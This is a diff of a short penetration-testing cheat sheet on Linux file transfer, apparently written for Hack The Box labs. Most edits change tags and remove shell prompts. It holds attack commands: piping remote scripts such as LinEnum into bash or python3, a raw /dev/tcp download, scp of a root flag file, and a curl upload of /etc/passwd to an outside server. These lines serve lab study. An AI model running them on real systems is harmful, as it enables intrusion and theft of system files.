@@ -1,4 +1,4 @@
-[[Pentest/File Transfer/Linux]]
+#linux/file-transfer
 [[File transfer common]]
 # Download files
 ```shell
@@ -6,34 +6,28 @@ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /
 
 curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 ```
-
 #### Fileless
 ```shell
 curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
 
 wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
 ```
-
-#### Bash
-#bash
+#### #bash
 ```shell
-h@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
+exec 3<>/dev/tcp/10.10.10.32/80
 
-h@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
 
-h@htb[/htb]$ cat <&3
+cat <&3
 ```
-
 #### SSH
-[[ssh]]
 ```shell
-h@htb[/htb]$ sudo systemctl start ssh
+sudo systemctl start ssh
 
-h@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
+scp plaintext@192.168.49.128:/root/myroot.txt . 
 ```
 
 # Upload files
-
 Start server:
 ```shell
 sudo python3 -m pip install --user uploadserver
@@ -48,7 +42,7 @@ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/e
 ```
 
 Python/PHP/Ruby servers:
-#python #php [[ruby]]
+#python #php #ruby #nodejs 
 ```shell
 python3 -m http.server
 
